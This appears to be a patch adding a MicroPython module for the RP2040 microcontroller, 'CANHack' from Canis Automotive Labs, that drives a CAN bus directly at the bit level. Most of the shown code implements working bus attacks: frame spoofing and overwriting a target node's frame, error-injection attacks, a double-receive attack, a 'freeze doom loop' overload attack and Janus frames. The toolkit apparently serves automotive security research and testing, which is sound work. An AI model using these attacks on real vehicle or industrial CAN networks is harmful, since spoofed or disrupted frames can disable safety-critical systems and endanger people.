+    buf_get_for_send(mp_bytes, &bufinfo, data);
+
+    if (bufinfo.len > max_len) {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "Bytes parameter too long"));
+    }
+    for (mp_uint_t i = 0; i < bufinfo.len; i++) {
+        dest[i] = ((byte*)bufinfo.buf)[i];
+    }
+
+    return bufinfo.len;
+}
+
+typedef struct _canhack_rp2_obj_t {
+    mp_obj_base_t base;
+    uint32_t bit_rate_kbps;
+} canhack_rp2_obj_t;
+
+
+// Construct a CAN hack object.
+//
+// The physical pins of the CAN bus is:
+//
+//  RP2040 GP22 = CAN TX = Pico pin 29
+//  RP2040 GP21 = CAN RX = Pico pin 27
+//
+// These ports need to be initialized as outputs.
+//
+// The timer being used will be the 16-bit free-running counter of PWM 7 (see RP2040 Datasheet section 4.4),
+// a 16-bit counter value at CH7_CTR. The counter must be clocked at the full speed of the CPU.
+
+
+// init(bit_time, sample_point)
+STATIC mp_obj_t rp2_canhack_init_helper(canhack_rp2_obj_t *self, size_t n_args, const mp_obj_t *pos_args, mp_map_t *kw_args) {
+    enum { ARG_mode, ARG_extframe, ARG_prescaler, ARG_sjw, ARG_bs1, ARG_bs2, ARG_auto_restart };
+    static const mp_arg_t allowed_args[] = {
+            { MP_QSTR_bit_rate,     MP_ARG_KW_ONLY | MP_ARG_INT,   {.u_int  = 500} },
+    };
+
+    // parse args
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all(n_args, pos_args, kw_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    uint32_t bit_rate = args[0].u_int;
+
+    if (bit_rate != 500 && bit_rate != 250 && bit_rate != 125) {
+    }
+
+    self->bit_rate_kbps = bit_rate;
+    init_gpio();
+
+    switch (bit_rate) {
+        case 500U:
+            init_ctr(BAUD_500KBIT_PRESCALE);
+            break;
+        case 250U:
+            init_ctr(BAUD_250KBIT_PRESCALE);
+            break;
+        case 125U:
+            init_ctr(BAUD_125KBIT_PRESCALE);
+            break;
+        default:
+            nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "Valid baud rates are 500, 250, 125 kbit/sec"));
+            // NOTREACHED
+    }
+    canhack_init();
+
+    SET_CAN_TX_REC();
+
+    return mp_const_none;
+}
+
+STATIC mp_obj_t rp2_canhack_init(size_t n_args, const mp_obj_t *args, mp_map_t *kw_args) {
+    return rp2_canhack_init_helper(MP_OBJ_TO_PTR(args[0]), n_args - 1, args + 1, kw_args);
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_KW(rp2_canhack_init_obj, 1, rp2_canhack_init);
+
+// CANHack(...)
+STATIC mp_obj_t rp2_canhack_make_new(const mp_obj_type_t *type, size_t n_args, size_t n_kw, const mp_obj_t *args) {
+    mp_arg_check_num(n_args, n_kw, 0, MP_OBJ_FUN_ARGS_MAX, true);
+
+    canhack_rp2_obj_t *self = m_new_obj(canhack_rp2_obj_t);
+    self->base.type = &rp2_canhack_type;
+
+    // configure the object
+    mp_map_t kw_args;
+    mp_map_init_fixed_table(&kw_args, n_kw, args + n_args);
+
+    rp2_canhack_init_helper(self, n_args, args, &kw_args);
+
+    return self;
+}
+
+STATIC mp_obj_t rp2_canhack_set_frame(mp_uint_t n_args, const mp_obj_t *pos_args, mp_map_t *kw_args)
+{
+    static const mp_arg_t allowed_args[] = {
+            { MP_QSTR_can_id,    MP_ARG_REQUIRED | MP_ARG_INT, {.u_int = 0x7ff} },
+            { MP_QSTR_remote,    MP_ARG_KW_ONLY | MP_ARG_BOOL, {.u_bool = false} },
+            { MP_QSTR_extended,  MP_ARG_KW_ONLY | MP_ARG_BOOL, {.u_bool = false} },
+            { MP_QSTR_data,      MP_ARG_KW_ONLY  | MP_ARG_OBJ,  {.u_obj = MP_OBJ_NULL} },
+            { MP_QSTR_set_dlc,   MP_ARG_KW_ONLY  | MP_ARG_BOOL,  {.u_bool = false} },
+            { MP_QSTR_dlc,       MP_ARG_KW_ONLY  | MP_ARG_INT,  {.u_int = 0} },
+            { MP_QSTR_second,    MP_ARG_KW_ONLY  | MP_ARG_BOOL,  {.u_bool = false} },
+    };
+
+    // parse args
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all(n_args - 1, pos_args + 1, kw_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    uint32_t can_id = args[0].u_int;
+    bool rtr = args[1].u_bool;
+    bool ide = args[2].u_bool;
+    mp_obj_t data_obj = args[3].u_obj;
+    bool set_dlc = args[4].u_bool;
+
+    bool second = args[6].u_bool;
+
+    uint32_t len;
+    uint32_t dlc;
+    uint8_t data[8];
+
+    if(data_obj == MP_OBJ_NULL) {
+        len = 0;
+    }
+    else {
+        len = copy_mp_bytes(data_obj, data, 8U);
+    }
+
+    // DLC can be set if remote, but must have no payload
+    if(rtr && (len > 0)) {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "Remote frames cannot have a payload"));
+    }
+    // 8 byte frames max
+    if (len > 8U) {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "Payload cannot be more than 8 bytes"));
+    }
+
+    if (set_dlc) {
+        dlc = args[5].u_int;
+        // DLC cannot be > 15
+        if (dlc > 15U) {
+            nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "DLC must be <= 15"));
+        }
+    }
+    else {
+        dlc = len;
+    }
+
+    uint32_t id_a;
+    uint32_t id_b;
+
+    // Pull apart CAN ID field into ID A and B.
+    if (ide) {
+        id_a = (can_id >> 18U) & 0x7ffU;
+        id_b = can_id & 0x3ffffU;
+    }
+    else {
+        id_a = can_id & 0x7ffU;
+        id_b =  0;
+    }
+    canhack_frame_t *frame = canhack_get_frame(second);
+    canhack_set_frame(id_a, id_b, rtr, ide, dlc, data, frame);
+
+    return mp_const_none;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_KW(rp2_canhack_set_frame_obj, 1, rp2_canhack_set_frame);
+
+#define ANSI_COLOR_RED     "\x1b[31m"
+#define ANSI_COLOR_GREEN   "\x1b[32m"
+#define ANSI_COLOR_YELLOW  "\x1b[33m"
+#define ANSI_COLOR_BLUE    "\x1b[34m"
+#define ANSI_COLOR_MAGENTA "\x1b[35m"
+#define ANSI_COLOR_CYAN    "\x1b[36m"
+#define ANSI_COLOR_RESET   "\x1b[0m"
+
+// Simple function to create Micropython bytes from a block of memory
+STATIC mp_obj_t make_mp_bytes(const uint8_t *src, uint32_t len)
+{
+    vstr_t vstr;
+    vstr_init_len(&vstr, len);
+    for (mp_uint_t i = 0; i < len; i++) {
+        vstr.buf[i] = src[i];
+    }
+
+    return mp_obj_new_str_from_vstr(&mp_type_bytes, &vstr);
+}
+
+STATIC mp_obj_t rp2_canhack_get_frame(mp_uint_t n_args, const mp_obj_t *pos_args, mp_map_t *kw_args)
+{
+    static const mp_arg_t allowed_args[] = {
+            { MP_QSTR_second,           MP_ARG_KW_ONLY  | MP_ARG_BOOL,  {.u_bool = false} },
+    };
+
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all(n_args - 1, pos_args + 1, kw_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    bool second = args[0].u_bool;
+    uint8_t frame_bits[CANHACK_MAX_BITS];
+    mp_obj_t frame_bytes;
+    mp_obj_t stuff_bit_bytes;
+
+    // Return a tuple of:
+    // String for bits (including stuff bits)
+    // String for bits (excluding stuff bits)
+    // Integers for last bit of arbitration ID, etc.
+
+    canhack_frame_t *frame = canhack_get_frame(second);
+
+    if (!frame->frame_set) {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "CAN frame has not been set"));
+    }
+
+    for(uint32_t i = 0; i < frame->tx_bits; i++) {
+        frame_bits[i] = frame->tx_bitstream[i] ? '1' : '0';
+    }
+    frame_bytes = make_mp_bytes(frame_bits, frame->tx_bits);
+
+    for(uint32_t i = 0; i < frame->tx_bits; i++) {
+        frame_bits[i] = frame->stuff_bit[i] ? 'X' : '-';
+    }
+    stuff_bit_bytes = make_mp_bytes(frame_bits, frame->tx_bits);
+
+    mp_obj_tuple_t *tuple = mp_obj_new_tuple(8, NULL);
+    tuple->items[0] = frame_bytes;
+    tuple->items[1] = stuff_bit_bytes;
+    tuple->items[2] = mp_obj_new_int_from_uint(frame->last_arbitration_bit);
+    tuple->items[3] = mp_obj_new_int_from_uint(frame->last_dlc_bit);
+    tuple->items[4] = mp_obj_new_int_from_uint(frame->last_data_bit);
+    tuple->items[5] = mp_obj_new_int_from_uint(frame->last_crc_bit);
+    tuple->items[6] = mp_obj_new_int_from_uint(frame->last_eof_bit);
+    tuple->items[7] = mp_obj_new_int_from_uint(frame->crc_rg);
+
+    return tuple;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_KW(rp2_canhack_get_frame_obj, 1, rp2_canhack_get_frame);
+
+STATIC mp_obj_t rp2_canhack_print_frame(mp_uint_t n_args, const mp_obj_t *pos_args, mp_map_t *kw_args)
+{
+    static const mp_arg_t allowed_args[] = {
+            { MP_QSTR_stuff_bits,           MP_ARG_KW_ONLY  | MP_ARG_BOOL,  {.u_bool = true} },
+            { MP_QSTR_second,               MP_ARG_KW_ONLY  | MP_ARG_BOOL,  {.u_bool = false} },
+    };
+
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all(n_args - 1, pos_args + 1, kw_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    bool stuff_bits = args[0].u_bool;
+    bool second = args[1].u_bool;
+
+    canhack_frame_t *frame = canhack_get_frame(second);
+
+    if (!frame->frame_set) {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "CAN frame has not been set"));
+    }
+
+    char *colour = ANSI_COLOR_YELLOW;
+    mp_printf(MP_PYTHON_PRINTER, "%s", colour);
+    for (uint32_t i = 0; i < frame->tx_bits; i++) {
+        char *bit_str = frame->tx_bitstream[i] ? "1" : "0";
+        if (frame->stuff_bit[i]) {
+            if (stuff_bits) {
+                mp_printf(MP_PYTHON_PRINTER, "%s%s%s", ANSI_COLOR_RED, bit_str, colour);
+            }
+        }
+        else {
+            mp_printf(MP_PYTHON_PRINTER, "%s", bit_str);
+        }
+        if (i == frame->last_arbitration_bit) {
+            colour = ANSI_COLOR_BLUE;
+            mp_printf(MP_PYTHON_PRINTER, "%s", colour);
+        }
+        if (i == frame->last_dlc_bit) {
+            colour = ANSI_COLOR_GREEN;
+            mp_printf(MP_PYTHON_PRINTER, "%s", colour);
+        }
+        if (i == frame->last_data_bit) {
+            colour = ANSI_COLOR_CYAN;
+            mp_printf(MP_PYTHON_PRINTER, "%s", colour);
+        }
+        if (i == frame->last_crc_bit) {
+            colour = ANSI_COLOR_RESET;
+            mp_printf(MP_PYTHON_PRINTER, "%s", colour);
+        }
+    }
+    mp_printf(MP_PYTHON_PRINTER, ANSI_COLOR_RESET "\n");
+
+    return mp_const_none;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_KW(rp2_canhack_print_frame_obj, 1, rp2_canhack_print_frame);
+
+STATIC mp_obj_t rp2_canhack_send_frame(mp_uint_t n_args, const mp_obj_t *pos_args, mp_map_t *kw_args)
+{
+    static const mp_arg_t allowed_args[] = {
+            { MP_QSTR_timeout,           MP_ARG_KW_ONLY  | MP_ARG_INT,  {.u_int = 65535U} },
+            { MP_QSTR_second,            MP_ARG_KW_ONLY  | MP_ARG_BOOL,  {.u_bool = false} },
+            { MP_QSTR_retries,           MP_ARG_KW_ONLY  | MP_ARG_INT,  {.u_int = 0} },
+    };
+
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all(n_args - 1, pos_args + 1, kw_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    uint32_t timeout = args[0].u_int;
+    bool second = args[1].u_bool;
+    uint32_t retries = args[2].u_int;
+
+    canhack_frame_t *frame = canhack_get_frame(second);
+    if (!frame->frame_set) {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "CAN frame has not been set"));
+    }
+
+    // Disable interrupts around the library call because any interrupts will mess up the timing
+    disable_irq();
+    RESET_CLOCK(0);
+    // Transmit the frame with a timeout (default: 65K bit times, or about 130ms at 500kbit/sec)
+    canhack_send_frame(timeout, retries);
+    enable_irq();
+
+    return mp_const_none;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_KW(rp2_canhack_send_frame_obj, 1, rp2_canhack_send_frame);
+
+STATIC mp_obj_t rp2_canhack_send_janus_frame(mp_uint_t n_args, const mp_obj_t *pos_args, mp_map_t *kw_args)
+{
+    static const mp_arg_t allowed_args[] = {
+            { MP_QSTR_sync_time,         MP_ARG_KW_ONLY  | MP_ARG_INT,  {.u_int = 0} },
+            { MP_QSTR_split_time,        MP_ARG_KW_ONLY  | MP_ARG_INT,  {.u_int = 0} },
+            { MP_QSTR_timeout,           MP_ARG_KW_ONLY  | MP_ARG_INT,  {.u_int = 65535U} },
+            { MP_QSTR_retries,           MP_ARG_KW_ONLY  | MP_ARG_INT,  {.u_int = 0} },
+    };
+
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all(n_args - 1, pos_args + 1, kw_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    // Default to fractions of a bit time: 0-25% = sync time, 6.5%-62.5% = first bit, 62.5%-100% = second bit.
+    uint32_t sync_time = args[0].u_int ? args[0].u_int : BIT_TIME / 4U;
+    uint32_t split_time = args[1].u_int ? args[1].u_int : (BIT_TIME * 5U) / 8U;
+    uint32_t timeout = args[2].u_int;
+    uint32_t retries = args[3].u_int;
+
+    canhack_frame_t *frame1 = canhack_get_frame(false);
+    canhack_frame_t *frame2 = canhack_get_frame(true);
+    if (!frame1->frame_set) {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "CAN frame has not been set"));
+    }
+    if (!frame2->frame_set) {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "Second CAN frame has not been set"));
+    }
+
+    // Disable interrupts around the library call because any interrupts will mess up the timing
+    disable_irq();
+    // Transmit the frame with a timeout (default: 65K bit times, or about 130ms at 500kbit/sec)
+    canhack_send_janus_frame(timeout, sync_time, split_time, retries);
+    enable_irq();
+
+    return mp_const_none;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_KW(rp2_canhack_send_janus_frame_obj, 1, rp2_canhack_send_janus_frame);
+
+STATIC mp_obj_t rp2_canhack_spoof_frame(mp_uint_t n_args, const mp_obj_t *pos_args, mp_map_t *kw_args)
+{
+    static const mp_arg_t allowed_args[] = {
+            { MP_QSTR_timeout,           MP_ARG_KW_ONLY  | MP_ARG_INT,  {.u_int = 2000000U} },
+            { MP_QSTR_overwrite,         MP_ARG_KW_ONLY  | MP_ARG_BOOL,  {.u_bool = false} },
+            { MP_QSTR_sync_time,         MP_ARG_KW_ONLY  | MP_ARG_INT,  {.u_int = 0} },
+            { MP_QSTR_split_time,        MP_ARG_KW_ONLY  | MP_ARG_INT,  {.u_int = 0} },
+            { MP_QSTR_second,            MP_ARG_KW_ONLY  | MP_ARG_BOOL,  {.u_bool = false} },
+            { MP_QSTR_retries,           MP_ARG_KW_ONLY  | MP_ARG_INT,  {.u_int = false} },
+    };
+
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all(n_args - 1, pos_args + 1, kw_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    uint32_t timeout = args[0].u_int;
+    bool overwrite = args[1].u_bool;
+    uint32_t sync_time = args[2].u_int ? args[2].u_int : BIT_TIME / 4U;
+    uint32_t split_time = args[3].u_int ? args[3].u_int : (BIT_TIME * 5U) / 8U;
+    bool second = args[4].u_bool;
+    bool retries = args[5].u_int;
+
+    canhack_frame_t *frame = canhack_get_frame(false);
+    if (!frame->frame_set) {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "CAN frame has not been set"));
+    }
+    if (second) {
+        frame = canhack_get_frame(true);
+        if (!frame->frame_set) {
+            nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "Second CAN frame has not been set"));
+        }
+    }
+
+    // Target a frame
+    canhack_set_attack_masks();
+
+    if (overwrite) {
+        // Disable interrupts around the library call because any interrupts will mess up the timing
+        disable_irq();
+        // Transmit the frame with a timeout. Target must be in error passive mode.
+        canhack_spoof_frame_error_passive(timeout);
+        enable_irq();
+    }
+    else {
+        disable_irq();
+        // Transmit a frame after detecting the target frame
+        canhack_spoof_frame(timeout, second, sync_time, split_time, retries);
+        enable_irq();
+    }
+
+    return mp_const_none;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_KW(rp2_canhack_spoof_frame_obj, 1, rp2_canhack_spoof_frame);
+
+STATIC mp_obj_t rp2_canhack_error_attack(mp_uint_t n_args, const mp_obj_t *pos_args, mp_map_t *kw_args)
+{
+    static const mp_arg_t allowed_args[] = {
+            { MP_QSTR_repeat,           MP_ARG_KW_ONLY  | MP_ARG_INT,  {.u_int = 2U} },
+            { MP_QSTR_timeout,          MP_ARG_KW_ONLY  | MP_ARG_INT,  {.u_int = 2000000U} },
+    };
+
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all(n_args - 1, pos_args + 1, kw_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    uint32_t repeat = args[0].u_int;
+    uint32_t timeout = args[1].u_int;
+
+    canhack_frame_t *frame = canhack_get_frame(false);
+    if (!frame->frame_set) {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "CAN frame has not been set"));
+    }
+
+    // Target a frame
+    canhack_set_attack_masks();
+
+    disable_irq();
+    // Looking for 0111111 (targeting a bit in the error delimiter) to generate an error.
+    bool timeout_occurred = canhack_error_attack(timeout, repeat, true, 0x7fU, 0x3fU);
+    enable_irq();
+
+    return timeout_occurred ? mp_const_true : mp_const_false;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_KW(rp2_canhack_error_attack_obj, 1, rp2_canhack_error_attack);
+
+STATIC mp_obj_t rp2_canhack_double_receive_attack(mp_uint_t n_args, const mp_obj_t *pos_args, mp_map_t *kw_args)
+{
+    static const mp_arg_t allowed_args[] = {
+            { MP_QSTR_repeat,           MP_ARG_KW_ONLY  | MP_ARG_INT,  {.u_int = 2U} },
+            { MP_QSTR_timeout,          MP_ARG_KW_ONLY  | MP_ARG_INT,  {.u_int = 2000000U} },
+    };
+
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all(n_args - 1, pos_args + 1, kw_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    uint32_t repeat = args[0].u_int;
+    uint32_t timeout = args[1].u_int;
+
+    canhack_frame_t *frame = canhack_get_frame(false);
+    if (!frame->frame_set) {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "CAN frame has not been set"));
+    }
+
+    // Target a frame
+    canhack_set_attack_masks();
+
+    disable_irq();
+    do {
+        // Looking for 01111111 (targeting last bit of EOF) to generate an error.
+        canhack_error_attack(timeout, 1U, false, 0xffU, 0x7fU);
+    } while (repeat--);
+    enable_irq();
+
+    return mp_const_none;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_KW(rp2_canhack_double_receive_attack_obj, 1, rp2_canhack_double_receive_attack);
+
+STATIC mp_obj_t rp2_canhack_freeze_doom_loop_attack(mp_uint_t n_args, const mp_obj_t *pos_args, mp_map_t *kw_args)
+{
+    static const mp_arg_t allowed_args[] = {
+            { MP_QSTR_repeat,           MP_ARG_KW_ONLY  | MP_ARG_INT,  {.u_int = 2U} },
+            { MP_QSTR_timeout,           MP_ARG_KW_ONLY  | MP_ARG_INT,  {.u_int = 2000000U} },
+    };
+
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all(n_args - 1, pos_args + 1, kw_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    uint32_t repeat = args[0].u_int;
+    uint32_t timeout = args[1].u_int;
+
+    canhack_frame_t *frame = canhack_get_frame(false);
+    if (!frame->frame_set) {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "CAN frame has not been set"));
+    }
+
+    // Target a frame
+    canhack_set_attack_masks();
+
+    disable_irq();
+    // Looking for 011111111 (targeting first bit of IFS) to generate an overload.
+    canhack_error_attack(timeout, repeat, false, 0x1ffU, 0x0ffU);
+    enable_irq();
+
+    return mp_const_none;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_KW(rp2_canhack_freeze_doom_loop_attack_obj, 1, rp2_canhack_freeze_doom_loop_attack);
+
+STATIC mp_obj_t rp2_canhack_set_can_tx(mp_uint_t n_args, const mp_obj_t *pos_args, mp_map_t *kw_args)
+{
+    static const mp_arg_t allowed_args[] = {
+            { MP_QSTR_recessive,           MP_ARG_KW_ONLY  | MP_ARG_BOOL,  {.u_int = true} },
+    };
+
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all(n_args - 1, pos_args + 1, kw_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    if(args[0].u_bool) {
+        SET_CAN_TX_REC();
+    }
+    else {
+        SET_CAN_TX_DOM();
+    };
+
+    if (GET_CAN_RX()) {
+        return mp_const_true;
+    }
+    else {
+        return mp_const_false;
+    }
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_KW(rp2_canhack_set_can_tx_obj, 1, rp2_canhack_set_can_tx);
+
+
+STATIC mp_obj_t rp2_canhack_square_wave(mp_obj_t self_in)
+{
+    canhack_send_square_wave();
+    return mp_const_none;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canhack_square_wave_obj, rp2_canhack_square_wave);
+
+
+STATIC mp_obj_t rp2_canhack_loopback(mp_obj_t self_in)
+{
+    canhack_loopback();
+    return mp_const_none;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canhack_loopback_obj, rp2_canhack_loopback);
+
+
+STATIC mp_obj_t rp2_canhack_get_clock(mp_obj_t self_in)
+{
+    return mp_obj_new_int(GET_CLOCK());
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canhack_get_clock_obj, rp2_canhack_get_clock);
+
+
+STATIC mp_obj_t rp2_canhack_reset_clock(mp_obj_t self_in)
+{
+    ctr_t c = GET_CLOCK();
+    RESET_CLOCK(0);
+
+    return mp_obj_new_int(c);
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canhack_reset_clock_obj, rp2_canhack_reset_clock);
+
+ctr_t ts[160];
+
+__attribute__((noinline, long_call, section(".time_critical"))) void send_raw_frame(canhack_frame_t *frame )
+{
+    uint8_t tx_index = 1U;
+    uint8_t ts_index = 3U;
+    ctr_t bit_end;
+    uint8_t tx = frame->tx_bitstream[tx_index++];
+
+    // SOF is first bit
+    ts[0] = GET_CLOCK();
+    RESET_CLOCK(0);
+    ts[1] = GET_CLOCK();
+    SET_CAN_TX_DOM();
+    ts[2] = GET_CLOCK();
+    bit_end = BIT_TIME;
+    for (;;) {
+        if (GET_CLOCK() >= bit_end) {
+            SET_CAN_TX(tx);
+            ts[ts_index++] = GET_CLOCK();
+            tx = frame->tx_bitstream[tx_index++];
+            if ((tx_index >= frame->tx_bits)) {
+                SET_CAN_TX_REC();
+                break;
+            }
+            bit_end += BIT_TIME;
+        }
+    }
+}
+
+STATIC mp_obj_t rp2_canhack_send_raw(mp_obj_t self_in)
+{
+    canhack_frame_t *frame = canhack_get_frame(false);
+    if (!frame->frame_set) {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "CAN frame has not been set"));
+    }
+
+    disable_irq();
+    ///////////////////
+    send_raw_frame(frame);
+    ///////////////////
+    enable_irq();
+
+    for(uint i = 0; i < frame->tx_bits; i++) {
+        mp_printf(MP_PYTHON_PRINTER, "%d=%d (%d)\n", i, ts[i], ts[i] - BIT_TIME * (i - 2));
+    }
+
+    return mp_const_none;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canhack_send_raw_obj, rp2_canhack_send_raw);
+
+
+STATIC const mp_map_elem_t rp2_canhack_locals_dict_table[] = {
+        // instance methods
+        { MP_OBJ_NEW_QSTR(MP_QSTR_init), (mp_obj_t)&rp2_canhack_init_obj },
+        { MP_OBJ_NEW_QSTR(MP_QSTR_set_frame), (mp_obj_t)&rp2_canhack_set_frame_obj },
+        { MP_OBJ_NEW_QSTR(MP_QSTR_get_frame), (mp_obj_t)&rp2_canhack_get_frame_obj },
+        { MP_OBJ_NEW_QSTR(MP_QSTR_print_frame), (mp_obj_t)&rp2_canhack_print_frame_obj },
+        { MP_OBJ_NEW_QSTR(MP_QSTR_send_frame), (mp_obj_t)&rp2_canhack_send_frame_obj },
+        { MP_OBJ_NEW_QSTR(MP_QSTR_send_janus_frame), (mp_obj_t)&rp2_canhack_send_janus_frame_obj },
+        { MP_OBJ_NEW_QSTR(MP_QSTR_spoof_frame), (mp_obj_t)&rp2_canhack_spoof_frame_obj },
+        { MP_OBJ_NEW_QSTR(MP_QSTR_error_attack), (mp_obj_t)&rp2_canhack_error_attack_obj },
+        { MP_OBJ_NEW_QSTR(MP_QSTR_double_receive_attack), (mp_obj_t)&rp2_canhack_double_receive_attack_obj },
+        { MP_OBJ_NEW_QSTR(MP_QSTR_freeze_doom_loop_attack), (mp_obj_t)&rp2_canhack_freeze_doom_loop_attack_obj },
+        { MP_OBJ_NEW_QSTR(MP_QSTR_set_can_tx), (mp_obj_t)&rp2_canhack_set_can_tx_obj },
+        { MP_OBJ_NEW_QSTR(MP_QSTR_square_wave), (mp_obj_t)&rp2_canhack_square_wave_obj },
+        { MP_OBJ_NEW_QSTR(MP_QSTR_loopback), (mp_obj_t)&rp2_canhack_loopback_obj },
+        { MP_OBJ_NEW_QSTR(MP_QSTR_get_clock), (mp_obj_t)&rp2_canhack_get_clock_obj },
+        { MP_OBJ_NEW_QSTR(MP_QSTR_reset_clock), (mp_obj_t)&rp2_canhack_reset_clock_obj },
+        { MP_OBJ_NEW_QSTR(MP_QSTR_send_raw), (mp_obj_t)&rp2_canhack_send_raw_obj },
+};
+STATIC MP_DEFINE_CONST_DICT(rp2_canhack_locals_dict, rp2_canhack_locals_dict_table);
+
+STATIC void rp2_canhack_print(const mp_print_t *print, mp_obj_t self_in, mp_print_kind_t kind)
+{
+    canhack_rp2_obj_t *self = self_in;
+
+    mp_printf(print, "CANHack(bit_rate=%d)", self->bit_rate_kbps);
+}
+
+mp_uint_t canhack_ioctl(mp_obj_t self_in, mp_uint_t request, uintptr_t arg, int *errcode) {
+    // rp2_canhack_obj_t *self = MP_OBJ_TO_PTR(self_in);
+
+    *errcode = MP_EINVAL;
+    return -1;
+}
+
+STATIC const mp_stream_p_t canhack_stream_p = {
+        .ioctl = canhack_ioctl,
+        .is_text = false,
+};
+
+const mp_obj_type_t rp2_canhack_type = {
+        { &mp_type_type },
+        .name = MP_QSTR_CANHack,
+        .print = rp2_canhack_print,
+        .make_new = rp2_canhack_make_new,
+        .protocol = &canhack_stream_p,
+        .locals_dict = (mp_obj_t)&rp2_canhack_locals_dict,
+};
Index: ports/rp2/canis/common.h
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
<+>UTF-8
===================================================================
diff --git a/ports/rp2/canis/common.h b/ports/rp2/canis/common.h
new file mode 100644
--- /dev/null	(date 1620461592941)
+++ b/ports/rp2/canis/common.h	(date 1620461592941)
@@ -0,0 +1,38 @@
+// Copyright 2020 Canis Automotive Labs (https://canislabs.com)
+//
+// Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated
+// documentation files (the "Software"), to deal in the Software without restriction, including without limitation
+// the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and
+// to permit persons to whom the Software is furnished to do so, subject to the following conditions:
+//
+// The above copyright notice and this permission notice shall be included in all copies or substantial portions of
+// the Software.
+//
+// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO
+// THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
+// TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+// SOFTWARE.
+
+#ifndef FIRMWARE_COMMON_H
+#define FIRMWARE_COMMON_H
+
+#include <py/objstr.h>
+
+void rp2_buf_get_for_send(mp_obj_t o, mp_buffer_info_t *bufinfo, byte *tmp_data);
+uint32_t copy_mp_bytes(mp_obj_t *mp_bytes, uint8_t *dest, uint32_t max_len);
+mp_obj_t make_mp_bytes(const uint8_t *src, uint32_t len);
+
+// Writes a word to a big-endian buffer
+#define BIG_ENDIAN_BUF(buf, word)           ((buf)[0] = (uint8_t)(((word) >> 24) & 0xffU),  \
+                                             (buf)[1] = (uint8_t)(((word) >> 16) & 0xffU),  \
+                                             (buf)[2] = (uint8_t)(((word) >> 8) & 0xffU),   \
+                                             (buf)[3] = (uint8_t)((word) & 0xffU))
+
+// Extracts a word from a big-endian buffer
+#define BIG_ENDIAN_WORD(buf)                ((((uint32_t)(buf)[0]) << 24) |  \
